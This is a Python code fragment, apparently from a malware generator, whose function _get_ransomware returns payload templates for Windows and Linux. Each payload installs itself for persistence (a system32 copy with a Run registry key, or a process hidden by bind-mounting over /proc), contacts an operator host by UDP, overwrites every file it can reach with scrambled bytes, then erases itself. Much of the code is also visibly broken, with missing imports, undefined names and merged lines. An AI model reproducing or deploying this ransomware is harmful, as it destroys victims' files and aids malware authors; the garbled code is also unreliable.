def _get_ransomware(host,port,platform):
    if platform == 'WINDOWS':
        return """
import socket, os, sys\nfrom winreg import OpenKey, SetValueEx
def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
\n\tff = open("C:\\Windows\\system32\\SysHealth.exe" , "wb") 
\tff.write(f.read())\n\tf.close()\n\t\n\tff.close()os.system("C:\\Windows\\system32\\SysHealth.exe")
\tSetValueEx("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System Health",0,"REG_SZ", "C:\\Windows\\system32\\SysHealth.exe")
{keepyourselfalive}()
conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
conn.connect(('{host}' , int({port})))
from os import walk\nfrom string import ascii_lower as a
for l in a:\n\ttry :\n\t\topen(l +':\\')\n\texcept:\n\t\tpass\n\telse :ds.append(l)
for d in ds:\n\tfor r, _, fs in walk(d):\n\t\tif len(fs) == 0:\n\t\t\tpass\n\t\tfor f in fs:\n\t\t\twith open(r +'\\' +f, "rb+") as f:
\t\t\t\tfd = f.read()\n\t\t\t\tf.truncate()\n\t\t\t\tf.write(''.join(chr(ord(l) + {})for l in fd))
conn.send(b"->|")\nwith open(__file__, "rb+") as f:\n\tfd = f.read()\n\tf.truncate()\n\tf.write(b'0' * len(fd))\n\tos.remove(__file__)
    """
    elif platform == 'LINUX':
        return """
import os,subprocess, string, socket\n
def {relaunch}():\n\tproc = subprocess.Popen(
\t" ".join(sys.argv), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
def {hide_process}():\n\tch = string.uppercase + string.digits
\ttoken = "".join(random.choice(ch) for i in range(32))
\tif not os.path.isdir("/tmp/%s" % (token)) :\n\tif os.popen("sudo whoami").read() == "root":
\tos.system("sudo mkdir /tmp/%s && sudo mount -o bind /tmp/%s /proc/%s" % (os.getpid(), token, os.getpid()))
\tsignal.signal(signal.SIGTERM, {relaunch})\n\tsignal.signal(signal.SIGTINT, {relaunch})\n{hide_process}()
conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
conn.connect(('{host}' , int({port})))
from os import walk
for r, _, fs in walk('/'):\n\t\tif len(fs) == 0:\n\t\t\tpass\n\t\tfor f in fs:\n\t\t\twith open(r +'\\' +f, "rb+") as f:
\t\t\t\tfd = f.read()\n\t\t\t\tf.truncate()\n\t\t\t\tf.write(''.join(chr(ord(l) + {})for l in fd))
conn.send(b"->|")\nwith open(__file__, "rb+") as f:\n\tfd = f.read()\n\tf.truncate()\n\tf.write(b'0' * len(fd))\n\tos.remove(__file__)
    """